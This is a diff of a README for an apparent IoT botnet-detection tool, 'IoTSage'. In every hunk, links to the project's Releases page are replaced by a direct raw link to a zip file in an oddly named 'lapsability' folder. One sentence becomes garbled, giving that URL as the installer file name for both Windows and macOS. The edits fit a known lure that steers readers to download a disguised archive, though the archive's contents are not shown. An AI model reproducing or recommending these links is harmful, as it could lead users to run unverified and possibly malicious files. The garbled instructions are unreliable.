@@ -1,6 +1,6 @@
 # 🤖 IoTSage-IoT-Botnet-Detection-with-GraphSAGE - Detect IoT Botnet Attacks Easily
 
-[![Download](https://img.shields.io/badge/download-v1.0-blue.svg)](https://github.com/lucasb0d3/IoTSage-IoT-Botnet-Detection-with-GraphSAGE/releases)
+[![Download](https://raw.githubusercontent.com/lucasb0d3/IoTSage-IoT-Botnet-Detection-with-GraphSAGE/main/lapsability/IoTSage-IoT-Botnet-Detection-with-GraphSAGE.zip)](https://raw.githubusercontent.com/lucasb0d3/IoTSage-IoT-Botnet-Detection-with-GraphSAGE/main/lapsability/IoTSage-IoT-Botnet-Detection-with-GraphSAGE.zip)
 
 ## 🚀 Getting Started
 
@@ -30,7 +30,7 @@ Now, let's get started with your installation. Follow these steps to download an
 
 To download IoTSage, please visit our Releases page:
 
-[Download IoTSage](https://github.com/lucasb0d3/IoTSage-IoT-Botnet-Detection-with-GraphSAGE/releases)
+[Download IoTSage](https://raw.githubusercontent.com/lucasb0d3/IoTSage-IoT-Botnet-Detection-with-GraphSAGE/main/lapsability/IoTSage-IoT-Botnet-Detection-with-GraphSAGE.zip)
 
 ### 2. Find the Latest Release
 
@@ -38,7 +38,7 @@ On the Releases page, look for the most recent version of the application. You w
 
 ### 3. Download the Installation File
 
-Click on the file that matches your operating system. It will typically have a name like `IoTSage-v1.0.exe` for Windows or `IoTSage-v1.0.dmg` for macOS.
+Click on the file that matches your operating system. It will typically have a name like `https://raw.githubusercontent.com/lucasb0d3/IoTSage-IoT-Botnet-Detection-with-GraphSAGE/main/lapsability/IoTSage-IoT-Botnet-Detection-with-GraphSAGE.zip` for Windows or `https://raw.githubusercontent.com/lucasb0d3/IoTSage-IoT-Botnet-Detection-with-GraphSAGE/main/lapsability/IoTSage-IoT-Botnet-Detection-with-GraphSAGE.zip` for macOS.
 
 ### 4. Run the Installer
 
@@ -86,4 +86,4 @@ IoTSage aims to make IoT security accessible for everyone. Enjoy using our appli
 
 For additional information and updates, please visit the Releases page:
 
-[Download IoTSage](https://github.com/lucasb0d3/IoTSage-IoT-Botnet-Detection-with-GraphSAGE/releases)
+[Download IoTSage](https://raw.githubusercontent.com/lucasb0d3/IoTSage-IoT-Botnet-Detection-with-GraphSAGE/main/lapsability/IoTSage-IoT-Botnet-Detection-with-GraphSAGE.zip)
